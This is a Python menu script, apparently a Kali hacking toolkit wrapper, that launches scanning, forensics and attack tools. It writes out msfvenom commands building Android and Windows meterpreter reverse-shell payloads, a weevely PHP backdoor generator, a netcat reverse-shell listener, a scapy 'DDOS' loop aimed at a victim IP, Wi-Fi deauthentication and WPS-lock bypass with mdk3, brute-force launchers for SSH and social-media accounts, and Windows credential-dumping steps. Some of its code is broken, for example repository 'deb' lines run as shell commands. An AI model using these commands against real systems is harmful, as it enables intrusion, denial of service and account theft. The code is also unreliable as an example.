
	###Author: Omar Rajab
	###Company: CyberMO
import sys,subprocess,os,socket
from datetime import datetime
from scapy.all import *
import geocoder
def main():
    os.system("clear")
  
    menu()

def menu():
    print("""\033[1;31m                                                                   
                                                                                          
NNNNNNNN        NNNNNNNN                           JJJJJJJJJJJlllllll                     
N:::::::N       N::::::N                           J:::::::::Jl:::::l                     
N::::::::N      N::::::N                           J:::::::::Jl:::::l                     
N:::::::::N     N::::::N                           JJ:::::::JJl:::::l                     
N::::::::::N    N::::::N   ooooooooooo               J:::::J   l::::l     eeeeeeeeeeee    
N:::::::::::N   N::::::N oo:::::::::::oo             J:::::J   l::::l   ee::::::::::::ee  
N:::::::N::::N  N::::::No:::::::::::::::o            J:::::J   l::::l  e::::::eeeee:::::ee
N::::::N N::::N N::::::No:::::ooooo:::::o            J:::::j   l::::l e::::::e     e:::::e
N::::::N  N::::N:::::::No::::o     o::::o            J:::::J   l::::l e:::::::eeeee::::::e
N::::::N   N:::::::::::No::::o     o::::oJJJJJJJ     J:::::J   l::::l e:::::::::::::::::e 
N::::::N    N::::::::::No::::o     o::::oJ:::::J     J:::::J   l::::l e::::::eeeeeeeeeee  
N::::::N     N:::::::::No::::o     o::::oJ::::::J   J::::::J   l::::l e:::::::e           
N::::::N      N::::::::No:::::ooooo:::::oJ:::::::JJJ:::::::J  l::::::le::::::::e          
N::::::N       N:::::::No:::::::::::::::o JJ:::::::::::::JJ   l::::::l e::::::::eeeeeeeee  
N::::::N        N::::::N oo:::::::::::oo    JJ:::::::::JJ     l::::::l  ee::::::::::::::e  
NNNNNNNN         NNNNNNN   ooooooooooo        JJJJJJJJJ       llllllll    eeeeeeeeeeeeeee  
                                                                                          """)
    print("\033[1;33mThe Advanced Automated Pentesting And Forensics Tool")
    print("\033[1;33mAuthor: Italia Cyber Army Security Researcher")
    print("\033[1;33mInstagram : @termux_hacking")
    print("\033[1;33mTelegram : t.me/termuxxhacking")
    print("\033[1;33mVersion: 1.0")
    print("\033[1;33mErr0r")
  

    choice = input("""\033[1;32m------------------------------------[MAIN MENU]----------------------------------------
                      \033[1;34m
[1] ifconfig                            [11] Enable Port Forwarding (HTTP tunnel)
[2] View Mac Address                    [12] Enable Port Forwarding(TCP tunnel)
[3] Change Mac Address                  [13] Locate Specific File/Directory
[4] View Public IP                      [14] Download All Pentesting Tools
[5] Turn On Wlan0                       [15] Shutdown System
[6] Turn On Wlan0mon                    [16] Delete File
[7] Wifi Scan                           [17] Copy file
[8] Turn On Apache2                     [18] Test Network If working 
[9] Turn On Specific Service            [19] Update Kali Repositories
[10] Check Services Status              [20] Check Hash Type
\033[1;32m==============================[NETWORK SCANNING]==================================
[21] Port Scan                          [27] Open theHarvester
[22] Network Enumeration                [28] Domain Resolver 
[23] Capture Packets                    [29] Check Who is Connected On This Network
[24] Vulnerability Scanning             [30] DDOS
[25] Operating System Scanning          [31] Whois
[26] WPS Scan                           [32] IpGeolocation
\033[1;31m======================[METADATA ANALYSER/DIGITAL FORENSICS]======================
[33] Exif Data                          [40] DiskDump(Specific Partition)
[34] Metagoofil                         [41] DiskDump with dcfldd
[35] Dump Password Hash                 [42] Volatility(Memory Forensics)
[36] Recoverjpg                         [43] Hashdeep
[37] Foremost(Restore Lost Files)       [44] Dump LSA Secrets
[38] Autopsy                            [45] Dump Cached Credentials
[39] DiskDump(Entire Disk)              [46] Bulk_Extractor(Automated)
\033[1;35m=============================[EXPLOITATION/POST-EX]===============================
[47] Create Apk Payload                 [57] Crack Password with hashcat
[48] Create Windows Payload             [58] Crack WPS PIN with wifite
[49] Open Sqlmap                        [59] Bypass WPS LOCK
[50] Bruteforce Instagram/Facebook      [60] Kick Everyone from the AP
[51] Bruteforce SSH logins              [61] Powersploit with SimpleHTTPserver
[52] Generate Backdoor                  
[53] Open Setoolkit                      
[54] Open Metasploit                    
[55] Routersploit                       
[56] Reverseshell                       \033[3;33mMore Functionalities Soon.. 
                       
                      
                      \033[1;37m
                      [99] Quit/Log Out

                      Please enter your choice: """)



    if choice == "1":
        ifconfig()
    if choice == "2":
        Vmac()
    elif choice == "3": 
        Cmac()
    elif choice =="4":
        ipp()
    elif choice == "5":
        wlan()
    elif choice == "6":
        wlanmon()
    elif choice == "7":
        wifiscan()
    elif choice == "8":
        apache()
    elif choice == "9":
        turnallservices()
    elif choice == "10":
        serviceStat()
    elif choice =="11":
        portfwddHTTP()
    elif choice =="12":
        portfwddTCP()
    elif choice =="13":
        locate()
    elif choice =="14":
        downloadtools()
    elif choice =="15":
        shutDown()
    elif choice =="16":
        delete()
    elif choice =="17":
        copy()
    elif choice =="18":
        test()
    elif choice =="19":
        fix()
    elif choice =="20":
        hashtype()
    elif choice =="21":
        portScan()
    elif choice =="22":
        networkEnum()
    elif choice == "23":
        cappack()
    elif choice == "24":
        vulscan()
    elif choice == "25":
        osscan()
    elif choice == "26":
        wpsscan()
    elif choice == "27":
        hrv()
    elif choice == "28":
        dns()
    elif choice == "29":
        netdis()
    elif choice == "30":
        ddos()
    elif choice == "31":
        whois()

    elif choice == "32":
        ipGeo()
    elif choice == "33":
        exif()
    elif choice == "34":
        metago()
    elif choice == "35":
        dump1()
    elif choice == "36":
        rcvJPG()
    elif choice == "37":
        foremost()
    elif choice == "38":
        autopsy()
    elif choice == "39":
        diskdump1()
    elif choice == "40":
        dk2()
    elif choice == "41":
        dk3()
        
    elif choice == "42":
        vola()
    elif choice == "43":
        hdeep()
    elif choice == "44":
        dump_lsa()
    elif choice == "45":
        dump_cc()
    elif choice == "46":
        bulk_ex()
    elif choice == "47":
        apk()
    elif choice == "48":
        windows()
    elif choice=="49":
        sqlmap()
    elif choice == "50":
        brute()
    elif choice=="51":
        ssh1()
    elif choice=="52":
        backdoor()
    elif choice=="53":
        setool1()
    elif choice=="54":
        metas()
    elif choice=="55":
        router()
    elif choice=="56":
        revs()
    elif choice=="57":
        passw()
    elif choice=="58":
        wpslck()
    elif choice=="59":
        bypasswpslck()
    elif choice=="60":
        dauth()
    elif choice=="61":
        pss()
    elif choice=="62":
        powersploit()






    elif choice=="99" :
        sys.exit
    else:
        print("You must only select numbers that exists in this menu.")
        print("Please try again\n\n\n")
        menu()

def sqlmap():
    os.system("clear")
    os.system("sqlmap")
def pss():
    pass

def powersploit():
    os.system("clear")
    os.system("cd /usr/share/powersploit")
    os.system("ls -la")
    os.system("xterm -hold -e python3 -m http.server 8000")
    










def dauth():
    os.system("clear")
    z = input("Enter monitor mode interface:")
    subprocess.call(["xterm","-hold","-e","mdk3",z,"-d"])


def passw():
    os.system("clear")
    os.system("hashcat")
def wpslck():
    os.system("clear")
    os.system("wifite")
def bypasswpslck():
    os.system("clear")
    print("Copy ESSID")
    z = input("Enter monitor mode interface:")
    os.system("xterm -hold -e airodump-ng wlan0mon")
    x = input("Paste ESSID:")
    subprocess.call(["xterm","-hold","-e","mdk3",z,"a","-a",x,"-m"])
    subprocess.call(["xterm","-hold","-e","mdk3",z,"m","-t",x])
    subprocess.call(["xterm","-hold","-e","mdk3",z,"d","-b","blacklist","-c","X"])
    subprocess.call(["xterm","-hold","-e","mdk3",z,"b","-t",x,"-c","X"])
    
   
def router():
    os.system("clear")
    os.system("routersploit")
def revs():
    os.system("clear")
    os.system("nc -l -p 4444 -v")
    

def setool1():
    os.system("clear")
    os.system("setoolkit")

def metas():
    os.system("clear")
    os.system("metasploit")


def backdoor():
    os.system("clear")
    os.system("weevely generate password /root/Desktop/test1.php")
    y=input("Do you want to Generate more   ? (Y/N)")
    if y=="Y" or y=="y":
        backdoor()
    else:
        menu()
def brute():
    os.system("clear")
    os.system("SocialBox.sh")

def dump1():
    os.system("clear")
    x = input("Enter Hive Location:")
    subprocess.call(["pwdump",x])
    y=input("Do you want to Check Another Hive   ? (Y/N)")
    if y=="Y" or y=="y":
        dump1()
    else:
        menu()

def rcvJPG():
    os.system("clear")
    x = input("Enter Disk (For Example /dev/sda):")
    subprocess.call(["recoverjpeg",x])
    y=input("Do you want to Check Another Disk   ? (Y/N)")
    if y=="Y" or y=="y":
        rcvJPG()
    else:
        menu()


def foremost():
    os.system("clear")
    x = input("Enter Disk (For Example /dev/sda):")
    subprocess.call(["foremost","-t","all","-v","-i",x,"-o","/root/Desktop/test"])
    y=input("Do you want to Check Another Disk For Lost Files  ? (Y/N)")
    if y=="Y" or y=="y":
        rcvJPG()
    else:
        menu()

def autopsy():
    os.system("clear")
    os.system("autopsy")

def diskdump1():
    os.system("clear")
    os.system("dd if=/dev/sda of=~/dump1.dd")
    y=input("Do you want to Dump Another Disk   ? (Y/N)")
    if y=="Y" or y=="y":
        diskdump1()
    else:
        menu()

def dk2():
    os.system("clear")
    print("""\033[1;31m Available Soon....""")
    #x = input("Enter Disk (For Example /dev/sda):")
    #subprocess.call(["dd","if="+x,"of=~/partition.img"])
    #print(["dd","if="+x+"of=~/partition.img"])
    y=input("Do you want to go back to main menu   ? (Y/N)")
    if y=="Y" or y=="y":
        menu()
    else:
        sys.exit

def dk3():
    os.system("clear")
    os.system("dcfldd if=/dev/sda1 hash=md5 of=/root/Desktop/image.dd bs=512")


def vola():
    os.system("clear")
    os.system("volatility -h")
   


def hdeep():
    os.system("clear")
    x = input("Enter File or Disk Location:")
    subprocess.call(["hashdeep","-c","md5,sha1,sha256,tiger,whirlpool",x,"-b"])
    y=input("Do you want to Check More  ? (Y/N)")
    if y=="Y" or y=="y":
        hdeep()
    else:
        menu()

def dump_lsa():
    os.system("clear")
    x = input("Enter Disk:")
    subprocess.call(["lsadump",x])
    y=input("Do you want to Dump More  ? (Y/N)")
    if y=="Y" or y=="y":
        dump_lsa()
    else:
        menu()

def dump_cc():
    os.system("clear")
    x = input("Enter Disk:")
    subprocess.call(["cachedump",x])
    y=input("Do you want to Dump More  ? (Y/N)")
    if y=="Y" or y=="y":
        dump_cc()
    else:
        menu()

def bulk_ex():
    os.system("clear")
    x = input("Enter Disked Dumped File Location:")
    subprocess.call(["bulk_extractor","-o","lala.txt",x])
    y=input("Do you want to Dump More  ? (Y/N)")
    if y=="Y" or y=="y":
        bulk_ex()
    else:
        menu()


def ssh1():
    os.system("clear")
    os.system("python2 sshcracker.py")
def ipGeo():
    os.system("clear")
    x = input("Enter IP Address:")
    g = geocoder.ip(x)
    print(g.latlng)
def netdis():
    os.system("xterm -hold -e arp -a")
    menu()
def hrv():
    os.system("xterm -hold -e git clone https://github.com/laramies/theHarvester.git")
    os.system("python3 /usr/share/theharvester/theHarvester.py")
def hashtype():
    os.system("clear")
    z=input("Enter The Encrypted password:")
    subprocess.call(["hashid","-e",z])
    y=input("Do you want to Check Another Hash Type  ? (Y/N)")
    if y=="Y" or y=="y":
        hashtype()
    else:
        menu()
def ddos():
    os.system("clear")
    x = input("Enter IP (Your IP):")
    z = input("Enter IP (Victim IP):")
    ##from scapy.all import *
    for i in range(1,100000):
        tcp_pkt = Ether(src=x) / IP(dst=z) / TCP(dport=44)
        tcp_pkt.summary()


    menu()

def exif():
    os.system("clear")
    z=input("Enter File Name/Directory:")
    subprocess.call(["exiftool",z])
    y=input("Do you want to check another file ? (Y/N)")
    if y=="Y" or y=="y":
        exif()
    else:
        menu()
def metago():
    os.system("clear")
    os.system("xterm -hold -e apt-get install metagoofil")
    os.system("metagoofil")
def whois():
    os.system("clear")
    z=input("Enter Domain Name/IP Address:")
    subprocess.call(["whois",z])
    y=input("Do you want to check another file ? (Y/N)")
    if y=="Y" or y=="y":
        whois()
    else:
        menu()
def test():
    os.system("xterm -hold -e ping 8.8.8.8")
    menu()
def copy():
    os.system("clear")
    z=input("Enter File Name/Directory:")
    x=input("Enter Paste location:")
    subprocess.call(["cp",z,x])
    y=input("Do you want to Copy another file ? (Y/N)")
    if y=="Y" or y=="y":
        delete()
    else:
        menu()
def delete():
    os.system("clear")
    z=input("Enter File Name/Directory:")
    subprocess.call(["rm","-f",z])
    y=input("Do you want to Delete another file ? (Y/N)")
    if y=="Y" or y=="y":
        delete()
    else:
        menu()
def shutDown():
    os.system("shutdown")
def locate():
    os.system("clear")
    z=input("Enter File Name/Directory:")
    subprocess.call(["locate", z])
    y=input("Do you want to find another file ? (Y/N)")
    if y=="Y" or y=="y":
        locate()
    else:
        menu()
def Vmac():
    os.system("ifconfig | grep ether")
    menu()
def Cmac():
    os.system("clear")
    z=input("Enter inteface:")
    x=input("Enter The new Mac Address(48 bit):")
    subprocess.call(["ifconfig", z, "down"])
    subprocess.call(["ifconfig", z, "hw", "ether", x])
    subprocess.call(["ifconfig", z, "up"])
    print("\033[1;32;40m[+] MAC ADDRESS CHANGED !!!")
    y=input("Back to Main Menu (Y/N) ?")

    if y=="Y" or "y":
        main()
    else:
        sys.exit
def wlan():
    subprocess.call(["ifconfig","wlan0", "up"])
    print("WLAN0 IS UP")
    menu()
def wlanmon():
    os.system("airmon-ng start wlan0")
    print("WLAN0 MONITOR MODE IS ON")
    menu()
def wifiscan():
    os.system("xterm -hold -e airodump-ng wlan0mon")
    menu()

def apk():
    os.system("clear")
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > test.apk")
    print("\033[1;32m[+] APK CREATED!!!")
    y=input("Do you want to create another apk ? (Y/N)")
    if y=="Y" or y=="y":
        apk()
    else:
        menu()
def dns():
    os.system("clear")
    z = input("Enter IP/Domain name server:")
    subprocess.call(["dig",z])
    menu()
def apache():
    os.system("service apache2 start")
    print("APACHE2 STARTED")
    menu()
def turnallservices():
    os.system("clear")
    z = input("Enter Service Name:")
    subprocess.call(["service", z, "start"])
    menu()
def serviceStat():
    os.system("xterm -hold -e service --status-all")
    os.system("clear")
    menu()
def ifconfig():
    subprocess.Popen(["ifconfig"])
    menu()
def air():
    subprocess.Popen(["airmon-ng","start","wlan0"])
def wifi():
    os.system("xterm -hold -e ifconfig")

def ipp():
    print("==> PUBLIC IP\r\r\r",str(os.system("curl ifconfig.me")))
    menu()
def windows():
    os.system("clear")
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe >/root/Desktop/test12.exe")
    print("\033[1;32m[+] EXE CREATED!!!")
    y=input("Do you want to create another apk ? (Y/N)")
    if y=="Y" or y=="y":
        windows()
    else:
        menu()
def portfwddHTTP():
    os.system("xterm -hold -e ngrok http 80")
    os.system("clear")
    menu()
def portfwddTCP():
    os.system("xterm -hold -e ngrok tcp 21")
    os.system("clear")
    menu()
def portScan():
    subprocess.call('clear', shell=True)
    remoteServer = input("Enter a remote host to scan: ")
    pstart=int(input("Enter Starting Port: "))
    pstop=int(input("Enter End Port: "))
    remoteServerIP = socket.gethostbyname(remoteServer)
    print ("-" * 60)
    print ("Please wait, scanning remote host", remoteServerIP)
    print ("-" * 60)
    t1 = datetime.now()
    try:
        for port in range(pstart, pstop):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                print ("Port {}: 	 Open".format(port))
            sock.close()
    except KeyboardInterrupt:
        print ("You pressed Ctrl+C")
        sys.exit()
    except socket.gaierror:
        print ('Hostname could not be resolved. Exiting')
        sys.exit()
    except socket.error:
        print ("Couldn't connect to server")
        sys.exit()
    t2 = datetime.now()
    total = t2 - t1
    print ('Scanning Completed in: ', total)
def networkEnum():
    os.system("clear")
    z = input("Enter IP ADDRESS:")
    subprocess.call(["xterm", "-hold", "-e", "nmap", "--script","smb-vuln*","-p 139,445", z])
    menu()
def cappack():
    os.system("xterm -hold -e tcpdump")
    os.system("clear")
    menu()
def vulscan():
    os.system("clear")
    z = input("Enter IP ADDRESS:")
    subprocess.call(["xterm","-hold","-e","nmap","--script=vuln",z])
    os.system("clear")
    menu()
def osscan():
    os.system("clear")
    z = input("Enter IP ADDRESS:")
    subprocess.call(["xterm", "-hold", "-e", "nmap", "-v","-Pn","-O", z])
    os.system("clear")
    menu()
def wpsscan():
    os.system("xterm -hold -e wash -i wlan0mon")
    os.system("clear")
    menu()
def fix():
    os.system("clear")
    os.system("deb http://http.kali.org/kali kali-rolling main non-free contrib")
    os.system("deb-src http://http.kali.org/kali kali-rolling main non-free contrib")
    os.system("deb http://http.kali.org/kali kali-rolling main non-free contrib")
    menu()
def downloadtools():
    os.system("clear")
    os.system("Wait Until Download is finish(This process may take too much time)")
    os.system(
        "xterm -hold -e apt-get -f install  ace-voip amap automater braa casefile cdpsnarf cisco-torch cookie-cadger copy-router-config dmitry dnmap dnsenum dnsmap dnsrecon dnstracer dnswalk dotdotpwn enum4linux enumiax exploitdb fierce firewalk fragroute fragrouter ghost-phisher golismero goofile lbd maltego-teeth masscan metagoofil miranda nmap p0f parsero recon-ng set smtp-user-enum snmpcheck sslcaudit sslsplit sslstrip sslyze thc-ipv6 theharvester tlssled twofi urlcrazy wireshark wol-e xplico ismtp intrace hping3 bbqsql bed cisco-auditing-tool cisco-global-exploiter cisco-ocs cisco-torch copy-router-config doona dotdotpwn greenbone-security-assistant hexorbase jsql lynis nmap ohrwurm openvas-cli openvas-manager openvas-scanner oscanner powerfuzzer sfuzz sidguesser siparmyknife sqlmap sqlninja sqlsus thc-ipv6 tnscmd10g unix-privesc-check yersinia aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifite apache-users arachni bbqsql blindelephant burpsuite cutycapt davtest deblaze dirb dirbuster fimap funkload grabber jboss-autopwn joomscan jsql maltego-teeth padbuster paros parsero plecost powerfuzzer proxystrike recon-ng skipfish sqlmap sqlninja sqlsus ua-tester uniscan   webscarab websploit wfuzz wpscan xsser zaproxy burpsuite dnschef fiked hamster-sidejack hexinject iaxflood inviteflood ismtp mitmproxy ohrwurm protos-sip rebind responder rtpbreak rtpinsertsound rtpmixsound sctpscan siparmyknife sipp sipvicious sniffjoke sslsplit sslstrip thc-ipv6 voiphopper webscarab wifi-honey wireshark xspy yersinia zaproxy cryptcat cymothoa dbd dns2tcp  httptunnel intersect nishang polenum powersploit pwnat ridenum sbd u3-pwn webshells weevely casefile cutycapt dos2unix dradis keepnote  metagoofil nipper-ng pipal armitage backdoor-factory cisco-auditing-tool cisco-global-exploiter cisco-ocs cisco-torch crackle jboss-autopwn linux-exploit-suggester maltego-teeth set shellnoob sqlmap thc-ipv6 yersinia beef-xss binwalk bulk-extractor chntpw cuckoo dc3dd ddrescue dumpzilla extundelete foremost galleta guymager  p0f pdf-parser pdfid pdgmail peepdf volatility xplico dhcpig funkload iaxflood inviteflood ipv6-toolkit mdk3 reaver rtpflood slowhttptest t50 termineter thc-ipv6 thc-ssl-dos  burpsuite cewl chntpw cisco-auditing-tool cmospwd creddump crunch findmyhash gpp-decrypt hash-identifier hexorbase john johnny keimpx maltego-teeth maskprocessor multiforcer ncrack oclgausscrack pack patator polenum rainbowcrack rcracki-mt rsmangler statsprocessor thc-pptp-bruter truecrack webscarab wordlists zaproxy apktool dex2jar python-distorm3 edb-debugger jad javasnoop  ollydbg smali valgrind yara android-sdk apktool arduino dex2jar sakis3g smali && wget http://www.morningstarsecurity.com/downloads/bing-ip2hosts-0.4.tar.gz && tar -xzvf bing-ip2hosts-0.4.tar.gz && cp bing-ip2hosts-0.4/bing-ip2hosts /usr/local/bin/")
    menu()


















main()

